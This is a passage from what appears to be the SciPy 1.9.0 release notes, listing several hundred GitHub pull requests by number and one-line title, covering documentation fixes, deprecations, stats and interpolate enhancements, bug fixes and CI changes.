<https://github.com/scipy/scipy/pull/15564>`__: DOC: stray backticks\n* `15565 <https://github.com/scipy/scipy/pull/15565>`__: DOC: incorrect underline lenght in section.\n* `15567 <https://github.com/scipy/scipy/pull/15567>`__: ENH: stats.pareto fit improvement for parameter combinations\n* `15569 <https://github.com/scipy/scipy/pull/15569>`__: DOC: pip quickstart: setup.py -> meson\n* `15570 <https://github.com/scipy/scipy/pull/15570>`__: MAINT: bump test tolerance in test_linprog\n* `15571 <https://github.com/scipy/scipy/pull/15571>`__: DOC: Wrong underline length\n* `15578 <https://github.com/scipy/scipy/pull/15578>`__: Make Windows Python setup more standard\n* `15581 <https://github.com/scipy/scipy/pull/15581>`__: MAINT: clarify deprecation warning spatial.transform.rotation\n* `15583 <https://github.com/scipy/scipy/pull/15583>`__: DOC: clarify O(N) SO(N) in random rotations\n* `15586 <https://github.com/scipy/scipy/pull/15586>`__: ENH: stats: Add 'alternative' and confidence interval to pearsonr\n* `15590 <https://github.com/scipy/scipy/pull/15590>`__: DOC: factorialk docstring inconsistent with code\n* `15597 <https://github.com/scipy/scipy/pull/15597>`__: DOC: update \\`hyp2f1\\` docstring example based on doctest\n* `15598 <https://github.com/scipy/scipy/pull/15598>`__: BUG/ENH: \\`lsq_linear\\`: fixed incorrect \\`lsmr_tol\\` in first...\n* `15603 <https://github.com/scipy/scipy/pull/15603>`__: BENCH: optimize: milp: add MILP benchmarks\n* `15606 <https://github.com/scipy/scipy/pull/15606>`__: MAINT: allow multiplication sign \\`\u00d7\\`\n* `15611 <https://github.com/scipy/scipy/pull/15611>`__: BUG:signal: Fix median bias in csd(..., average=\"median\")\n* `15616 <https://github.com/scipy/scipy/pull/15616>`__: CI: pin asv to avoid slowdowns in 0.5/0.5.1\n* `15619 <https://github.com/scipy/scipy/pull/15619>`__: DOC: stats: update interval and moment method signatures\n* `15625 <https://github.com/scipy/scipy/pull/15625>`__: MAINT: Clean up \\`type: ignore\\` comments related to third-party...\n* `15626 <https://github.com/scipy/scipy/pull/15626>`__: TST, MAINT: ignore np distutils dep\n* `15629 <https://github.com/scipy/scipy/pull/15629>`__: MAINT: stats: fix \\`trim1\\` \\`axis\\` behavior\n* `15632 <https://github.com/scipy/scipy/pull/15632>`__: ENH: stats.wilcoxon: return z-statistic (as requested)\n* `15634 <https://github.com/scipy/scipy/pull/15634>`__: CI: Improve concurrency to cancel running jobs on PR update\n* `15645 <https://github.com/scipy/scipy/pull/15645>`__: DOC: Add code example to the documentation of \\`sparse.linalg.cg\\`.\n* `15646 <https://github.com/scipy/scipy/pull/15646>`__: DOC: stats.ks_1samp: correct examples\n* `15647 <https://github.com/scipy/scipy/pull/15647>`__: ENH: add variable bits to \\`stats.qmc.Sobol\\`\n* `15648 <https://github.com/scipy/scipy/pull/15648>`__: DOC: Add examples to documentation for \\`scipy.special.ellipr{c,d,f,g,j}\\`\n* `15649 <https://github.com/scipy/scipy/pull/15649>`__: DEV/DOC: remove latex/pdf documentation\n* `15651 <https://github.com/scipy/scipy/pull/15651>`__: DOC: stats.ks_2samp/stats.kstest: correct examples\n* `15652 <https://github.com/scipy/scipy/pull/15652>`__: DOC: stats.circstd: add reference, notes, comments\n* `15655 <https://github.com/scipy/scipy/pull/15655>`__: REL: fix small issue in pavement.py for release note writing\n* `15656 <https://github.com/scipy/scipy/pull/15656>`__: DOC: Fix example for subset_by_index in eigh doc\n* `15661 <https://github.com/scipy/scipy/pull/15661>`__: DOC: Additional examples for optimize user guide\n* `15662 <https://github.com/scipy/scipy/pull/15662>`__: DOC: stats.fit: fix intermittent failure in doctest\n* `15663 <https://github.com/scipy/scipy/pull/15663>`__: DOC: stats.burr12: fix typo\n* `15664 <https://github.com/scipy/scipy/pull/15664>`__: BENCH: Add benchmarks for special.factorial/factorial2/factorialk\n* `15673 <https://github.com/scipy/scipy/pull/15673>`__: DOC: fix intersphinx links\n* `15682 <https://github.com/scipy/scipy/pull/15682>`__: MAINT: sparse.linalg: Clear up unnecessary modules imported in...\n* `15684 <https://github.com/scipy/scipy/pull/15684>`__: DOC: add formula and documentation improvements for scipy.special.chndtr...\n* `15690 <https://github.com/scipy/scipy/pull/15690>`__: ENH: add uarray multimethods for fast Hankel transforms\n* `15694 <https://github.com/scipy/scipy/pull/15694>`__: MAINT,CI: signal: fix failing refguide check\n* `15699 <https://github.com/scipy/scipy/pull/15699>`__: DOC: stats.ttest_1samp: update example\n* `15701 <https://github.com/scipy/scipy/pull/15701>`__: BUG: Fix dual_annealing bounds test\n* `15703 <https://github.com/scipy/scipy/pull/15703>`__: BUG: fix test fail in test_propack.py (loosen atol)\n* `15710 <https://github.com/scipy/scipy/pull/15710>`__: MAINT: sparse.linalg: \\`bnorm\\` only calculate once\n* `15712 <https://github.com/scipy/scipy/pull/15712>`__: ENH: \\`scipy.stats.qmc.Sobol\\`: allow 32 or 64 bit computation\n* `15715 <https://github.com/scipy/scipy/pull/15715>`__: ENH: stats: add _axis_nan_policy_factory to moment\n* `15718 <https://github.com/scipy/scipy/pull/15718>`__: ENH: Migration of \\`write_release_and_log\\` into standalone script\n* `15723 <https://github.com/scipy/scipy/pull/15723>`__: TST: stats: make \\`check_sample_var\\` two-sided\n* `15724 <https://github.com/scipy/scipy/pull/15724>`__: TST: stats: simplify \\`check_sample_mean\\`\n* `15725 <https://github.com/scipy/scipy/pull/15725>`__: DEV: Try to detect scipy from dev installed path\n* `15728 <https://github.com/scipy/scipy/pull/15728>`__: ENH: changed vague exception messages to a more descriptive ones...\n* `15729 <https://github.com/scipy/scipy/pull/15729>`__: ENH: stats: add weighted power mean\n* `15763 <https://github.com/scipy/scipy/pull/15763>`__: ENH: stats: replace ncf with Boost non_central_f distribution\n* `15766 <https://github.com/scipy/scipy/pull/15766>`__: BUG: improve exceptions for private attributes in refactored...\n* `15768 <https://github.com/scipy/scipy/pull/15768>`__: [DOC] fix typo in cython optimize help example\n* `15769 <https://github.com/scipy/scipy/pull/15769>`__: MAINT: stats: check integrality in \\`_argcheck\\` as needed\n* `15771 <https://github.com/scipy/scipy/pull/15771>`__: MAINT: stats: resolve discrete rvs dtype platform dependency\n* `15774 <https://github.com/scipy/scipy/pull/15774>`__: MAINT: stats: remove deprecated \\`median_absolute_deviation\\`\n* `15775 <https://github.com/scipy/scipy/pull/15775>`__: DOC: stats.lognorm: rephrase note about parameterization\n* `15776 <https://github.com/scipy/scipy/pull/15776>`__: DOC: stats.powerlaw: more explicit explanation of support\n* `15777 <https://github.com/scipy/scipy/pull/15777>`__: MAINT: stats.shapiro: subtract median from shapiro input\n* `15778 <https://github.com/scipy/scipy/pull/15778>`__: MAINT: stats: more specific error type from \\`rv_continuous.fit\\`\n* `15779 <https://github.com/scipy/scipy/pull/15779>`__: CI: don't run meson tests on forks and remove skip flags\n* `15782 <https://github.com/scipy/scipy/pull/15782>`__: DEPR: remove k=None in KDTree.query\n* `15783 <https://github.com/scipy/scipy/pull/15783>`__: CI:Pin pytest version to 7.0.1 on Azure\n* `15785 <https://github.com/scipy/scipy/pull/15785>`__: MAINT: stats: remove deprecated itemfreq\n* `15786 <https://github.com/scipy/scipy/pull/15786>`__: DOC: Add examples of integrals to integrate.quadpack\n* `15788 <https://github.com/scipy/scipy/pull/15788>`__: DOC: update macOS and Linux contributor docs to use Python 3.9\n* `15789 <https://github.com/scipy/scipy/pull/15789>`__: DOC, MAINT: Remove numpydoc submodule\n* `15791 <https://github.com/scipy/scipy/pull/15791>`__: MAINT: add ShapeInfo to continuous distributions in scipy.stats\n* `15795 <https://github.com/scipy/scipy/pull/15795>`__: DEP: remove n_jobs from cKDTree\n* `15797 <https://github.com/scipy/scipy/pull/15797>`__: scipy/_lib/boost: Update to d8626c9d2d937abf6a38a844522714ad72e63281\n* `15799 <https://github.com/scipy/scipy/pull/15799>`__: DEP: add warning for documented-as-deprecated extradoc\n* `15802 <https://github.com/scipy/scipy/pull/15802>`__: DOC: Import Error in examples\n* `15803 <https://github.com/scipy/scipy/pull/15803>`__: DOC: error in TransferFunctionDiscrete example\n* `15804 <https://github.com/scipy/scipy/pull/15804>`__: DEP: sharpen warning message on >1-dim for optimize.minimize\n* `15805 <https://github.com/scipy/scipy/pull/15805>`__: DEP: specify version to remove dual_annealing argument 'local_search_options'\n* `15809 <https://github.com/scipy/scipy/pull/15809>`__: DOC,MAINT: remove \\`quad_explain\\` that has become irrelevant.\n* `15810 <https://github.com/scipy/scipy/pull/15810>`__: DOC: stats.mood: validity only when observations are unique\n* `15811 <https://github.com/scipy/scipy/pull/15811>`__: DOC: fix evaluate_all_bspl example.\n* `15812 <https://github.com/scipy/scipy/pull/15812>`__: DOC: Couple of single to double backticks\n* `15813 <https://github.com/scipy/scipy/pull/15813>`__: DOC: information about skip on CircleCI\n* `15817 <https://github.com/scipy/scipy/pull/15817>`__: MAINT: stats.fisher_exact: improve docs and fix bugs\n* `15819 <https://github.com/scipy/scipy/pull/15819>`__: DEP: docstring-related deprecations (#15757)\n* `15821 <https://github.com/scipy/scipy/pull/15821>`__: DEP: add actual DeprecationWarning for sym_pos-keyword of scipy.linalg.solve\n* `15822 <https://github.com/scipy/scipy/pull/15822>`__: DEP: remove \\`right\\` from interpolate.PPoly.extend\n* `15823 <https://github.com/scipy/scipy/pull/15823>`__: DOC: Interpolative tutorial - wrong matrix fill var\n* `15824 <https://github.com/scipy/scipy/pull/15824>`__: BUG: Handle base case for scipy.integrate.simpson when span along...\n* `15825 <https://github.com/scipy/scipy/pull/15825>`__: TST: stats: xfail_on_32bit studentized_range moment test\n* `15827 <https://github.com/scipy/scipy/pull/15827>`__: DOC: change docs that specify the SNR ratio definition for find_peaks_cwt().\n* `15828 <https://github.com/scipy/scipy/pull/15828>`__: DEP: raise value error for object arrays\n* `15830 <https://github.com/scipy/scipy/pull/15830>`__: MAINT: stats: collocate bootstrap/permutation_test/monte_carlo_test\n* `15831 <https://github.com/scipy/scipy/pull/15831>`__: MAINT: stats.rv_generic: fix unnecessary call to \\`_munp\\` in...\n* `15835 <https://github.com/scipy/scipy/pull/15835>`__: FIX: Incorect boschloo pvalue\n* `15837 <https://github.com/scipy/scipy/pull/15837>`__: DOC: Simplify conda command\n* `15840 <https://github.com/scipy/scipy/pull/15840>`__: DOC: special: Add 'Examples' for wrightomega.\n* `15842 <https://github.com/scipy/scipy/pull/15842>`__: DOC: Add examples for \\`CGS\\`, \\`GCROTMK\\` and \\`BiCGSTAB\\` iterative...\n* `15846 <https://github.com/scipy/scipy/pull/15846>`__: DOC: Add efficiency condition for CSC sparse matrix and remove...\n* `15847 <https://github.com/scipy/scipy/pull/15847>`__: BUG: adds warning to scipy.stats.brunnermunzel\n* `15848 <https://github.com/scipy/scipy/pull/15848>`__: DOC: fix interp2d docs showing wrong Z array ordering.\n* `15850 <https://github.com/scipy/scipy/pull/15850>`__: MAINT: sparse.linalg: Missing tfqmr in the re-entrancy test\n* `15853 <https://github.com/scipy/scipy/pull/15853>`__: DEP: remove the keyword debug from linalg.solve\n* `15855 <https://github.com/scipy/scipy/pull/15855>`__: ENH: stats.rv_continuous.expect: split interval to improve reliability\n* `15867 <https://github.com/scipy/scipy/pull/15867>`__: CI: fix python version matrix in linux workflow\n* `15868 <https://github.com/scipy/scipy/pull/15868>`__: CI: fix Azure workflows\n* `15872 <https://github.com/scipy/scipy/pull/15872>`__: DEP: remove mlab from dendrogram\n* `15874 <https://github.com/scipy/scipy/pull/15874>`__: DEP: remove py_vq2\n* `15875 <https://github.com/scipy/scipy/pull/15875>`__: DEP: remove old BSR methods\n* `15876 <https://github.com/scipy/scipy/pull/15876>`__: DEP: remove _ppform\n* `15881 <https://github.com/scipy/scipy/pull/15881>`__: DEP: remove signal.windows.hanning\n* `15882 <https://github.com/scipy/scipy/pull/15882>`__: DEP: enforced radius in spherical voronoi\n* `15885 <https://github.com/scipy/scipy/pull/15885>`__: DOC: stats: clarify truncnorm shape parameter definition\n* `15886 <https://github.com/scipy/scipy/pull/15886>`__: BUG: check that iirfilter argument Wn satisfies Wn[0] < Wn[1]\n* `15887 <https://github.com/scipy/scipy/pull/15887>`__: DEP: remove ftol/xtol from neldermead\n* `15894 <https://github.com/scipy/scipy/pull/15894>`__: [BUG] make p-values consistent with the literature\n* `15895 <https://github.com/scipy/scipy/pull/15895>`__: CI: remove pin on Jinja2\n* `15898 <https://github.com/scipy/scipy/pull/15898>`__: DOC: stats: correct documentation of \\`wilcoxon\\`'s behavior...\n* `15900 <https://github.com/scipy/scipy/pull/15900>`__: DOC: fix import in example in _morestats\n* `15905 <https://github.com/scipy/scipy/pull/15905>`__: MAINT: stats._moment: warn when catastrophic cancellation occurs\n* `15909 <https://github.com/scipy/scipy/pull/15909>`__: DEP: deal with deprecation of ndim >1 in bspline\n* `15911 <https://github.com/scipy/scipy/pull/15911>`__: MAINT: stats: fix \\`gibrat\\` name\n* `15914 <https://github.com/scipy/scipy/pull/15914>`__: MAINT: special: Clean up C style in ndtr.c\n* `15916 <https://github.com/scipy/scipy/pull/15916>`__: MAINT: stats: adjust tolerance of failing TestTruncnorm\n* `15917 <https://github.com/scipy/scipy/pull/15917>`__: MAINT: stats: remove support for \\`_rvs\\` without \\`size\\` parameter\n* `15920 <https://github.com/scipy/scipy/pull/15920>`__: ENH: stats.mannwhitneyu: add iterative implementation\n* `15923 <https://github.com/scipy/scipy/pull/15923>`__: MAINT: stats: attempt to consolidate warnings and errors\n* `15932 <https://github.com/scipy/scipy/pull/15932>`__: MAINT: stats: fix and thoroughly test \\`rv_sample\\` at non-integer...\n* `15933 <https://github.com/scipy/scipy/pull/15933>`__: TST: test_nodata respect endianness\n* `15938 <https://github.com/scipy/scipy/pull/15938>`__: DOC: sparse.linalg: add citations for COLAMD\n* `15939 <https://github.com/scipy/scipy/pull/15939>`__: Update _dual_annealing.py\n* `15945 <https://github.com/scipy/scipy/pull/15945>`__: BUG/ENH: \\`MultinomialQMC.random\\` shape to (n, pvals)\n* `15946 <https://github.com/scipy/scipy/pull/15946>`__: DEP: remove inheritance to \\`QMCEngine\\` in \\`MultinomialQMC\\`...\n* `15947 <https://github.com/scipy/scipy/pull/15947>`__: DOC: Revamp contributor setup guides\n* `15953 <https://github.com/scipy/scipy/pull/15953>`__: DOC: Add meson docs to use gcc, clang build in parallel and optimization...\n* `15955 <https://github.com/scipy/scipy/pull/15955>`__: BUG Fix signature of D_IIR_forback(1,2)\n* `15959 <https://github.com/scipy/scipy/pull/15959>`__: ENH: Developer CLI for SciPy\n* `15965 <https://github.com/scipy/scipy/pull/15965>`__: MAINT: stats: ensure that \\`rv_continuous._fitstart\\` shapes...\n* `15968 <https://github.com/scipy/scipy/pull/15968>`__: BUG: Fix debug and coverage arguments with dev.py\n* `15970 <https://github.com/scipy/scipy/pull/15970>`__: BLD: specify \\`cython_lapack\\` dependency for \\`matfuncs_expm\\`\n* `15973 <https://github.com/scipy/scipy/pull/15973>`__: DOC: Add formula renderings to integrate.nquad.\n* `15981 <https://github.com/scipy/scipy/pull/15981>`__: ENH: optimize: Add Newton-TFQMR method and some tests for Newton-Krylov\n* `15982 <https://github.com/scipy/scipy/pull/15982>`__: BENCH: stats: Distribution memory and CDF/PPF round trip benchmarks\n* `15983 <https://github.com/scipy/scipy/pull/15983>`__: TST: sparse.linalg: Add tests for the parameter \\`show\\`\n* `15991 <https://github.com/scipy/scipy/pull/15991>`__: TST: fix for np.kron matrix issue.\n* `15992 <https://github.com/scipy/scipy/pull/15992>`__: DOC: Fixed \\`degrees\\` parameter in return section\n* `15997 <https://github.com/scipy/scipy/pull/15997>`__: MAINT: integrate: add \\`recursive\\` to QUADPACK Fortran sources\n* `15998 <https://github.com/scipy/scipy/pull/15998>`__: BUG: Fix yeojohnson when transformed data has zero variance\n* `15999 <https://github.com/scipy/scipy/pull/15999>`__: MAINT: Adds doit.db.db to gitignore\n* `16004 <https://github.com/scipy/scipy/pull/16004>`__: MAINT: rename MaximumFlowResult.residual to flow\n* `16005 <https://github.com/scipy/scipy/pull/16005>`__: DOC: sparse.linalg: Fixed the description of input matrix of...\n* `16010 <https://github.com/scipy/scipy/pull/16010>`__: MAINT: Add a check to verify all \\`.pyi\\` files are installed...\n* `16012 <https://github.com/scipy/scipy/pull/16012>`__: DOC: Fix broken link and add python headers to contributing guide\n* `16015 <https://github.com/scipy/scipy/pull/16015>`__: DEP: bump version for deprecating residual to flow.\n* `16018 <https://github.com/scipy/scipy/pull/16018>`__: Doc: fix arch linux building from source local dependencies instructions\n* `16019 <https://github.com/scipy/scipy/pull/16019>`__: DOC: fix conda env name in quickstart guide [skip ci]\n* `16021 <https://github.com/scipy/scipy/pull/16021>`__: DOC: typos in basinhopping documentation\n* `16024 <https://github.com/scipy/scipy/pull/16024>`__: CI: unpin pytest and pytest-xdist\n* `16026 <https://github.com/scipy/scipy/pull/16026>`__: BUG: Allow \\`spsolve_triangular\\` to work with matrices with...\n* `16029 <https://github.com/scipy/scipy/pull/16029>`__: BUG: Fix meson-info file errors and add more informative exception\n* `16030 <https://github.com/scipy/scipy/pull/16030>`__: MAINT: stats: more accurate error message for \\`multivariate_normal\\`\n* `16032 <https://github.com/scipy/scipy/pull/16032>`__: FIX: show warning when passing NAN into input of convolve method\n* `16037 <https://github.com/scipy/scipy/pull/16037>`__: MAINT: fix missing \\`f\\` prefix on f-strings\n* `16042 <https://github.com/scipy/scipy/pull/16042>`__: MAINT: stats.dirichlet: fix interface inconsistency\n* `16044 <https://github.com/scipy/scipy/pull/16044>`__: DEV: do.py, adoption of pkg pydevtool (removed non SciPy specific...\n* `16045 <https://github.com/scipy/scipy/pull/16045>`__: ENH: Use circleci-artifacts-redirector-action\n* `16051 <https://github.com/scipy/scipy/pull/16051>`__: MAINT: Miscellaneous small changes to filter_design\n* `16053 <https://github.com/scipy/scipy/pull/16053>`__: Mark fitpack sources as \\`recursive\\`\n* `16055 <https://github.com/scipy/scipy/pull/16055>`__: MAINT: stats: replace \\`np.var\\` with \\`_moment(..., 2)\\` to...\n* `16058 <https://github.com/scipy/scipy/pull/16058>`__: DEV: Fix meson debian python build\n* `16060 <https://github.com/scipy/scipy/pull/16060>`__: MAINT: Allow all Latin-1 Unicode letters in the source code.\n* `16062 <https://github.com/scipy/scipy/pull/16062>`__: DOC: Document QUADPACK routines used in \\`\\*quad\\`\n* `16067 <https://github.com/scipy/scipy/pull/16067>`__: DEP: remove spatial.distance.matching\n* `16070 <https://github.com/scipy/scipy/pull/16070>`__: ENH: interpolate: handle length-1 grid axes in RegularGridInterpolator\n* `16073 <https://github.com/scipy/scipy/pull/16073>`__: DOC: expand RegularGridInterpolator docstring\n* `16075 <https://github.com/scipy/scipy/pull/16075>`__: CI: Fix refguidecheck failures; unpin Sphinx\n* `16077 <https://github.com/scipy/scipy/pull/16077>`__: BUG: interpolate: RGI(nan) is nan\n* `16078 <https://github.com/scipy/scipy/pull/16078>`__: DEV,BLD: Use Meson in Gitpod builds\n* `16082 <https://github.com/scipy/scipy/pull/16082>`__: BUG: refguide-check: allow multiline namedtuples\n* `16083 <https://github.com/scipy/scipy/pull/16083>`__: DOC: fixing a sign issue in FFTlog function documentation\n* `16092 <https://github.com/scipy/scipy/pull/16092>`__: ENH: interpolate: Add functionality to accept descending points...\n* `16095 <https://github.com/scipy/scipy/pull/16095>`__: MAINT: Remove old filtered warnings\n* `16100 <https://github.com/scipy/scipy/pull/16100>`__: MAINT: Fix a couple compiler warnings.\n* `16104 <https://github.com/scipy/scipy/pull/16104>`__: DOC: stats: symmetry not checked for (inv)wishart distributions\n* `16111 <https://github.com/scipy/scipy/pull/16111>`__: BUG: Fix norm for sparse arrays\n* `16115 <https://github.com/scipy/scipy/pull/16115>`__: MAINT: merge \\`environment.yml\\` and \\`environment_meson.yml\\`\n* `16117 <https://github.com/scipy/scipy/pull/16117>`__: MAINT: stats.wilcoxon: return \\`zstatistic\\` only when \\`method='approx'\\`\n* `16118 <https://github.com/scipy/scipy/pull/16118>`__: Download openblas binary from GH repo\n* `16122 <https://github.com/scipy/scipy/pull/16122>`__: CI: Speed up ci build that keeps timing out\n* `16125 <https://github.com/scipy/scipy/pull/16125>`__: DOC: interpolate: fix typos \"the the\" -> \"the\"\n* `16126 <https://github.com/scipy/scipy/pull/16126>`__: DOC: interpolate: details rectilinear grids in docstrings\n* `16128 <https://github.com/scipy/scipy/pull/16128>`__: BUG: interpolate: fix extrapolation behaviors of \\`previous\\`...\n* `16130 <https://github.com/scipy/scipy/pull/16130>`__: Increase time to timeout on azure\n* `16134 <https://github.com/scipy/scipy/pull/16134>`__: BUG: signal: Fix calculation of extended image indices in convolve2d.\n* `16135 <https://github.com/scipy/scipy/pull/16135>`__: MAINT: sparse.linalg: A minor improvement with zero initial guess\n* `16137 <https://github.com/scipy/scipy/pull/16137>`__: Clean up fitpack smoke tests\n* `16138 <https://github.com/scipy/scipy/pull/16138>`__: TST: interpolate: mark rbf chunking tests as slow\n* `16141 <https://github.com/scipy/scipy/pull/16141>`__: DOC: Plot poles as x and zeros as o in signal\n* `16144 <https://github.com/scipy/scipy/pull/16144>`__: DEP: Execute deprecation for squeezing input vectors in spatial.distance\n* `16145 <https://github.com/scipy/scipy/pull/16145>`__: ENH: Fix signal.iircomb w0 bugs, add support for both frequency...\n* `16150 <https://github.com/scipy/scipy/pull/16150>`__: Add typing info for Rotation.concatenate\n* `16165 <https://github.com/scipy/scipy/pull/16165>`__: BUG: fix extension module initialization, needs use of \\`PyMODINIT_FUNC\\`\n* `16166 <https://github.com/scipy/scipy/pull/16166>`__: MAINT:linalg: Expose Cython functions for generic use\n* `16167 <https://github.com/scipy/scipy/pull/16167>`__: ENH: Tweak theilslopes and siegelslopes to return a tuple_bunch\n* `16168 <https://github.com/scipy/scipy/pull/16168>`__: BUG: special: Fix the test 'test_d' that is run when SCIPY_XSLOW...\n* `16173 <https://github.com/scipy/scipy/pull/16173>`__: Adds note to the curve_fit() docstring to use float64.\n* `16176 <https://github.com/scipy/scipy/pull/16176>`__: MAINT: remove questionable uses of \\`Py_FatalError\\` in module...\n* `16177 <https://github.com/scipy/scipy/pull/16177>`__: MAINT: Cleanup unused code in meson-files\n* `16180 <https://github.com/scipy/scipy/pull/16180>`__: DEV: do.py build. On setup checks if intro-buildoptions.json...\n* `16181 <https://github.com/scipy/scipy/pull/16181>`__: BUG: stats: fix multivariate_hypergeom.rvs method\n* `16183 <https://github.com/scipy/scipy/pull/16183>`__: ENH: Simplify return names in stats.theil/siegelslopes (and fix...\n* `16184 <https://github.com/scipy/scipy/pull/16184>`__: DEP: raise if fillvalue cannot be cast to output type in signal.convolve2d\n* `16185 <https://github.com/scipy/scipy/pull/16185>`__: BUG: stats: Fix handling of float32 inputs for the boost-based...\n* `16187 <https://github.com/scipy/scipy/pull/16187>`__: BLD: default to Meson in pyproject.toml\n* `16194 <https://github.com/scipy/scipy/pull/16194>`__: BLD: add a build option to force use of the g77 ABI with Meson\n* `16198 <https://github.com/scipy/scipy/pull/16198>`__: DEP: sharpen deprecation in NumericalInverseHermite\n* `16206 <https://github.com/scipy/scipy/pull/16206>`__: CI: Test NumPy main branch also with Python 3.11\n* `16220 <https://github.com/scipy/scipy/pull/16220>`__: Create a new spline from a partial derivative of a bivariate...\n* `16223 <https://github.com/scipy/scipy/pull/16223>`__: MAINT: interpolate: move RGI to a separate file\n* `16228 <https://github.com/scipy/scipy/pull/16228>`__: TST: interpolate: move test_spalde_scalar to other fitpack tests\n* `16229 <https://github.com/scipy/scipy/pull/16229>`__: REL: DOC: fix documentation URLs\n* `16230 <https://github.com/scipy/scipy/pull/16230>`__: BUG: fix extension module initialization, needs use of PyMODINIT_FUNC,...\n* `16239 <https://github.com/scipy/scipy/pull/16239>`__: MAINT: tools: Add more output to a refguide-check error message.\n* `16241 <https://github.com/scipy/scipy/pull/16241>`__: DOC: stats: update roadmap\n* `16242 <https://github.com/scipy/scipy/pull/16242>`__: BUG: Make KDTree more robust against nans.\n* `16245 <https://github.com/scipy/scipy/pull/16245>`__: DEP: Execute deprecation of pinv2\n* `16247 <https://github.com/scipy/scipy/pull/16247>`__: DOC:linalg: Remove references to removed pinv2 function\n* `16248 <https://github.com/scipy/scipy/pull/16248>`__: DOC: prep 1.9.0 release notes\n* `16249 <https://github.com/scipy/scipy/pull/16249>`__: Refguide check verbosity abs names\n* `16257 <https://github.com/scipy/scipy/pull/16257>`__: DEP: Deprecation follow-ups\n* `16259 <https://github.com/scipy/scipy/pull/16259>`__: Revert \"CI: pin Pip to 22.0.4 to avoid issues with \\`--no-build-isolation\\`\"\n* `16261 <https://github.com/scipy/scipy/pull/16261>`__: DEP: add deprecation warning to maxiter kwarg in _minimize_tnc\n* `16264 <https://github.com/scipy/scipy/pull/16264>`__: DOC: update the RegularGridInterpolator docstring\n* `16265 <https://github.com/scipy/scipy/pull/16265>`__: DEP: deprecate spatial.distance.kulsinski\n* `16267 <https://github.com/scipy/scipy/pull/16267>`__: DOC: broken donation link on GitHub\n* `16273 <https://github.com/scipy/scipy/pull/16273>`__: DOC: remove deprecated functions from refguide\n* `16276 <https://github.com/scipy/scipy/pull/16276>`__: MAINT: sparse.linalg: Update some docstrings.\n* `16279 <https://github.com/scipy/scipy/pull/16279>`__: MAINT: stats: override \\`loguniform.fit\\` to resolve overparameterization\n* `16282 <https://github.com/scipy/scipy/pull/16282>`__: BUG: special: DECREF scipy_special object before exiting sf_error().\n* `16283 <https://github.com/scipy/scipy/pull/16283>`__: Corrections To Docs\n* `16287 <https://github.com/scipy/scipy/pull/16287>`__: BLD: sync pyproject.toml changes from oldest-supported-numpy\n* `16289 <https://github.com/scipy/scipy/pull/16289>`__: MAINT: stats: remove function-specific warning messages\n* `16290 <https://github.com/scipy/scipy/pull/16290>`__: BLD: fix issue with \\`python setup.py install\\` and \\`_directmodule\\`\n* `16295 <https://github.com/scipy/scipy/pull/16295>`__: MAINT: move \\`import_array\\` before module creation in module...\n* `16296 <https://github.com/scipy/scipy/pull/16296>`__: DOC: REL: fix \\`make dist\\` issue with missing dependencies\n* `16303 <https://github.com/scipy/scipy/pull/16303>`__: MAINT: revert addition of multivariate_beta\n* `16304 <https://github.com/scipy/scipy/pull/16304>`__: MAINT: add a more informative error message for broken installs\n* `16309 <https://github.com/scipy/scipy/pull/16309>`__: BLD: CI: fix issue in wheel metadata, and add basic \"build in...\n* `16316 <https://github.com/scipy/scipy/pull/16316>`__: REL: update version switcher for 1.8.1\n* `16321 <https://github.com/scipy/scipy/pull/16321>`__: DOC: fix incorrect formatting of deprecation tags\n* `16326 <https://github.com/scipy/scipy/pull/16326>`__: REL: update version switcher for 1.9\n* `16329 <https://github.com/scipy/scipy/pull/16329>`__: MAINT: git security shim for 1.9.x\n* `16339 <https://github.com/scipy/scipy/pull/16339>`__: MAINT, TST: bump tol for _axis_nan_policy_test\n* `16341 <https://github.com/scipy/scipy/pull/16341>`__: BLD: update Pythran requirement to 0.11.0, to support Clang >=13\n* `16353 <https://github.com/scipy/scipy/pull/16353>`__: MAINT: version bounds 1.9.0rc1\n* `16360 <https://github.com/scipy/scipy/pull/16360>`__: MAINT, TST: sup warning for theilslopes\n* `16361 <https://github.com/scipy/scipy/pull/16361>`__: MAINT: SCIPY_USE_PROPACK\n* `16370 <https://github.com/scipy/scipy/pull/16370>`__: MAINT: update Boost submodule to include Cygwin fix\n* `16374 <https://github.com/scipy/scipy/pull/16374>`__: MAINT: update pydata-sphinx-theme\n* `16379 <https://github.com/scipy/scipy/pull/16379>`__: DOC: dark theme css adjustments\n* `16390 <https://github.com/scipy/scipy/pull/16390>`__: TST, MAINT: adjust 32-bit xfails for HiGHS\n* `16393 <https://github.com/scipy/scipy/pull/16393>`__: MAINT: use correct type for element wise comparison\n* `16414 <https://github.com/scipy/scipy/pull/16414>`__: BUG: spatial: Handle integer arrays in HalfspaceIntersection.\n* `16420 <https://github.com/scipy/scipy/pull/16420>`__: MAINT: next round of 1.9.0 backports\n* `16422 <https://github.com/scipy/scipy/pull/16422>`__: TST: fix test issues with casting-related warnings with numpy...\n* `16427 <https://github.com/scipy/scipy/pull/16427>`__: MAINT: stats.shapiro: don't modify input in place\n* `16429 <https://github.com/scipy/scipy/pull/16429>`__: MAINT: stats.mode: revert gh-15423\n* `16436 <https://github.com/scipy/scipy/pull/16436>`__: DOC: optimize: Mark deprecated linprog methods explicitly\n* `16444 <https://github.com/scipy/scipy/pull/16444>`__: BUG: fix fail to open tempfile in messagestream.pyx (#8850)\n* `16451 <https://github.com/scipy/scipy/pull/16451>`__: MAINT: few more 1.9.0 backports\n* `16453 <https://github.com/scipy/scipy/pull/16453>`__: DOC: Copy-edit 1.9.0-notes.rst\n* `16457 <https://github.com/scipy/scipy/pull/16457>`__: TST: skip 32-bit test_pdist_correlation_iris_nonC\n* `16458 <https://github.com/scipy/scipy/pull/16458>`__: MAINT: 1.9.0 backports\n* `16473 <https://github.com/scipy/scipy/pull/16473>`__: REL: update 1.9.0 release notes\n* `16482 <https://github.com/scipy/scipy/pull/16482>`__: DOC: Update Returns section of optimize.linprog.\n* `16484 <https://github.com/scipy/scipy/pull/16484>`__: MAINT: remove raw html from README.rst\n* `16485 <https://github.com/scipy/scipy/pull/16485>`__: BLD: fix warnings from f2py templating parsing\n* `16493 <https://github.com/scipy/scipy/pull/16493>`__: BLD: clean up unwanted files in sdist, via \\`.gitattributes\\`\n* `16507 <https://github.com/scipy/scipy/pull/16507>`__: REL: more tweaks to sdist contents\n* `16512 <https://github.com/scipy/scipy/pull/16512>`__: [1.9] MAINT: skip complex128 propack tests on windows\n* `16514 <https://github.com/scipy/scipy/pull/16514>`__: DOC: reflect correctly where windows wheels are built\n* `16526 <https://github.com/scipy/scipy/pull/16526>`__: MAINT: 1.9.0rc2 backports\n* `16530 